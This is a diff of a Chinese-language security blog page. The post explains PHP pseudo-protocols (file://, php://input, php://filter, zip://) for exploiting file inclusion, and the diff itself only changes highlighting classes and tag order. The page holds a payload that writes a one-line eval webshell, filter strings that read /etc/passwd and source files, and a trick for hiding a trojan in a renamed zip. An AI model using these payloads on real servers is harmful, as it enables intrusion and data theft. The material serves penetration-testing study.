@@ -191,7 +191,7 @@
 <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1></li>
 </ul>
 <h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file//协议"></a>file//协议</h2><p>双off<br>用于读取服务器www以外的文件，需要知道文件的绝对路径</p>
-<h2 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议"></a>php://input协议</h2><p>需要allow_url_include为on<br>用于访问请求的原始数据的只读流，如果是php代码则执行代码比如&lt;?php phpinfo()?&gt;<br>可以用来生成一句话木马文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>), <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议"></a>php://input协议</h2><p>需要allow_url_include为on<br>用于访问请求的原始数据的只读流，如果是php代码则执行代码比如&lt;?php phpinfo()?&gt;<br>可以用来生成一句话木马文件：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>), <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h2><p>双off，是一种数据流打开时的筛选过滤应用<br>最常用于读取文件源代码<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
 <p>zlib.deflate压缩数据<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/zlib.deflate/<span class="built_in">convert</span>.base64-encode/resource=/etc/passwd</span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-decode/zlib.inflate/resource=/tmp/<span class="number">1</span></span><br><span class="line">复现失败 没有读取到解压的数据</span><br></pre></td></tr></table></figure></p>
 <h2 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip://, bzip2://, zlib://协议"></a>zip://, bzip2://, zlib://协议</h2><p>双off<br>可以访问压缩文件中的子文件<br>可以将木马写在txt文件里，然后压缩为zip文件，重命名为jpg文件然后用zip等协议打开<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="string">//C</span>:<span class="string">/PHPstudy/WWW/1.jpg</span>%231.txt <span class="string">//</span><span class="comment">#必须用%23 前面必须是绝对路径</span></span><br><span class="line">compress.zlib:<span class="string">//1.jpg</span> <span class="string">//</span>后两者都可以用相对路径</span><br><span class="line">compress.bzip2:<span class="string">//1.jpg</span></span><br></pre></td></tr></table></figure></p>
@@ -498,15 +498,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">homepage</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Crypto</a>
               </li>
             
             <div class="clearfix"></div>
